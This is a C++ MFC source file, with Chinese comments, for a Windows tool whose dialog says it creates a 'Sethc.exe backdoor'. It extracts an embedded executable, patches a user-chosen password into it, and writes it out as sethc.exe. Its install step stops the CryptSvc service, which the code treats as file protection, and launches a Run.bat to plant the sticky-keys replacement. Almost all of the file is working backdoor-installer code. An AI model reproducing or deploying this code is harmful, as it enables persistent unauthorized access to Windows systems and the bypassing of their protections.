
// PayLoadDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "PayLoad.h"
#include "PayLoadDlg.h"
#include <winsvc.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

class CAboutDlg : public CDialog
{
public:
	CAboutDlg();

// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

	protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialog(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialog)
END_MESSAGE_MAP()


// CPayLoadDlg 对话框




CPayLoadDlg::CPayLoadDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CPayLoadDlg::IDD, pParent)
	, m_strPwd(_T(""))
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CPayLoadDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	DDX_Text(pDX, IDC_EDIT_PASSWORD, m_strPwd);
}

BEGIN_MESSAGE_MAP(CPayLoadDlg, CDialog)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDC_BTN_CREATE, &CPayLoadDlg::OnBnClickedBtnCreate)
	ON_EN_CHANGE(IDC_EDIT_PASSWORD, &CPayLoadDlg::OnEnChangeEditPassword)
	ON_BN_CLICKED(IDC_BTN_INSTALL, &CPayLoadDlg::OnBnClickedBtnInstall)
END_MESSAGE_MAP()


// CPayLoadDlg 消息处理程序

BOOL CPayLoadDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// 将“关于...”菜单项添加到系统菜单中。

	// IDM_ABOUTBOX 必须在系统命令范围内。
	ASSERT((IDM_ABOUTBOX & 0xFFF0) == IDM_ABOUTBOX);
	ASSERT(IDM_ABOUTBOX < 0xF000);

	CMenu* pSysMenu = GetSystemMenu(FALSE);
	if (pSysMenu != NULL)
	{
		BOOL bNameValid;
		CString strAboutMenu;
		bNameValid = strAboutMenu.LoadString(IDS_ABOUTBOX);
		ASSERT(bNameValid);
		if (!strAboutMenu.IsEmpty())
		{
			pSysMenu->AppendMenu(MF_SEPARATOR);
			pSysMenu->AppendMenu(MF_STRING, IDM_ABOUTBOX, strAboutMenu);
		}
	}

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	GetDlgItem(IDC_BTN_CREATE)->EnableWindow(FALSE);  //不能创建
	GetDlgItem(IDC_BTN_INSTALL)->EnableWindow(FALSE);   //不能安装

	// TODO: 在此添加额外的初始化代码

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

void CPayLoadDlg::OnSysCommand(UINT nID, LPARAM lParam)
{
	if ((nID & 0xFFF0) == IDM_ABOUTBOX)
	{
		CAboutDlg dlgAbout;
		dlgAbout.DoModal();
	}
	else
	{
		CDialog::OnSysCommand(nID, lParam);
	}
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CPayLoadDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CPayLoadDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

void CPayLoadDlg::OnEnChangeEditPassword()
{
	UpdateData(TRUE);
	if (!m_strPwd.IsEmpty())
	{
		GetDlgItem(IDC_BTN_CREATE)->EnableWindow(TRUE);
	}
	else
	{
		GetDlgItem(IDC_BTN_CREATE)->EnableWindow(FALSE);
	}

}

//创建sethc.exe文件
void CPayLoadDlg::OnBnClickedBtnCreate()
{
	// TODO: 在此添加控件通知处理程序代码
	if (m_strPwd.IsEmpty())
	{
		MessageBox(_T("Please Input initial Password!"), _T("Warning"), MB_ICONWARNING);
		return;
	}
	if (IDYES == MessageBox(_T("You will create a Sethc.exe backdoor, Do you want to continue?"), _T("Query"), MB_YESNO))
	{
		//释放exe文件
		if (ReleaseSethc())  //释放成功
		{
			CString strPwdMsg = _T("");
			strPwdMsg.Format(_T("Sethc.exe's password is \"%s\", please keep in mind!"), m_strPwd);
			MessageBox(strPwdMsg, _T("Create Success!"), MB_OK);
			GetDlgItem(IDC_BTN_INSTALL)->EnableWindow(TRUE);  //可以安装了
		}
		else
		{
			MessageBox(_T("Sorry ~~~ Sethc.exe Create Failed!"), _T("Create Failed"), MB_OK);
		}
	}
}

bool CPayLoadDlg::ReleaseSethc()
{
	bool bSuccess = true;
	HRSRC hRes = FindResource(NULL, MAKEINTRESOURCE(IDR_SETHC), _T("EXE"));
	if (NULL != hRes)
	{
		HGLOBAL hgRes = LoadResource(NULL, hRes);
		if (NULL != hgRes)
		{
			void* pRes = LockResource(hgRes);
			DWORD dwSize = 0;
			dwSize = SizeofResource(NULL, hRes);
			TCHAR* phMem = (TCHAR*)new TCHAR[dwSize + 1];
			if (WriteProcessMemory(GetCurrentProcess(), (void*)phMem, pRes, dwSize, NULL))
			{
				TCHAR szPassWord[MAX_PATH] = _T("AAAAAAAAAAAAAAAA");
				if (FindMem(phMem, dwSize, szPassWord, m_strPwd.GetBuffer(0)))
				{
					HANDLE hFilePath = INVALID_HANDLE_VALUE;
					CString strReleasePath = GetCurDir() + _T("sethc.exe");  //释放的文件
					hFilePath = CreateFile(strReleasePath, GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
					DWORD dwWrite = 0;
					WriteFile(hFilePath, (void*)phMem, dwSize, &dwWrite, NULL);
					CloseHandle(hFilePath);
				}
				else
				{
					bSuccess = false;
				}
			}
			else
			{
				bSuccess = false;
			}
			GlobalFree(hgRes);
		}
		else
		{
			bSuccess = false;
		}
	
	}
	else
	{
		bSuccess = false;
	}
	return bSuccess;
}

CString CPayLoadDlg::GetCurDir() const
{
	TCHAR  sDrive[_MAX_DRIVE];   
	TCHAR  sDir[_MAX_DIR];   
	TCHAR  sFilename[_MAX_FNAME],Filename[_MAX_FNAME];   
	TCHAR  sExt[_MAX_EXT];   
	GetModuleFileName(AfxGetInstanceHandle(), Filename, MAX_PATH);   
	_tsplitpath(Filename, sDrive, sDir, sFilename, sExt);   
	CString  homeDir(CString(sDrive)   +   CString(sDir));   
	int nLen = homeDir.GetLength();   
	if (_T('\\') != homeDir.GetAt(nLen-1))   
	{
		homeDir += _T('\\');
	}
	return homeDir;   
}

bool CPayLoadDlg::FindMem( IN TCHAR* pMem, IN const int nLen, IN TCHAR* pFrom, IN TCHAR* pTo )
{
	TCHAR szCharf[100] = {0};
	TCHAR szChart[100] = {0};
	TCHAR* pCharg;
	bool bResult = false;
	wcscpy(szCharf, pFrom);
	wcscpy(szChart, pTo);

	for (int nIndex = 0; nIndex < nLen ; nIndex++)
	{
		pCharg = pMem + nIndex;
		if (0 == wcscmp(pCharg, szCharf))
		{
			//这里要注意第四个参数
			if (WriteProcessMemory(GetCurrentProcess(), (void*)(pMem+nIndex), szChart, 2 * wcslen(szChart) + 1, NULL))
			{
				bResult = true;
			}
			break;
		}
	}
	return bResult;
}

//安装sethc.exe
void CPayLoadDlg::OnBnClickedBtnInstall()
{
	// TODO: 在此添加控件通知处理程序代码
	StopServer();
	CString strBatDir = GetCurDir() + _T("Run.bat");
	HINSTANCE hExec = ShellExecute(NULL, _T("open"), strBatDir, NULL, NULL, SW_SHOW);
	if ((DWORD)hExec <= 32)
	{
		MessageBox(_T("Sorry , Install Failed!"), _T("Failed"), MB_OK);
	}
	else
	{
		MessageBox(_T("OK , Install Success!"), _T("Success"), MB_OK);
	}
}

//停止文件保护的服务
void CPayLoadDlg::StopServer()
{
	SC_HANDLE hSC = ::OpenSCManager( NULL, 
		NULL, GENERIC_EXECUTE);
	if( hSC == NULL)
	{
		return ;
	}
	// 打开文件保护服务
	SC_HANDLE hSvc = ::OpenService( hSC, _T("CryptSvc"),
		SERVICE_START | SERVICE_QUERY_STATUS | SERVICE_STOP);
	if( hSvc == NULL)
	{
		::CloseServiceHandle( hSC);
		return ;
	}
	// 获得服务的状态
	SERVICE_STATUS status;
	if( ::QueryServiceStatus( hSvc, &status) == FALSE)
	{
		::CloseServiceHandle( hSvc);
		::CloseServiceHandle( hSC);
		return ;
	}
	//如果处于启动状态，则关闭服务
	if( status.dwCurrentState == SERVICE_RUNNING)
	{
		// 停止服务
		if( ::ControlService( hSvc, 
			SERVICE_CONTROL_STOP, &status) == FALSE)
		{
			::CloseServiceHandle( hSvc);
			::CloseServiceHandle( hSC);
			return ;
		}
		// 等待服务停止
		while( ::QueryServiceStatus( hSvc, &status) == TRUE)
		{
			::Sleep( status.dwWaitHint);
			if( status.dwCurrentState == SERVICE_STOPPED)
			{
				::CloseServiceHandle( hSvc);
				::CloseServiceHandle( hSC);
				return ;
			}
		}
	}

	::CloseServiceHandle( hSvc);
	::CloseServiceHandle( hSC);
}

BOOL CPayLoadDlg::PreTranslateMessage(MSG* pMsg)
{
	// TODO: 在此添加专用代码和/或调用基类
	if (WM_KEYDOWN == pMsg->message)
	{
		if (VK_RETURN == pMsg->wParam)
		{
			return TRUE;
		}
	}
	return CDialog::PreTranslateMessage(pMsg);
}
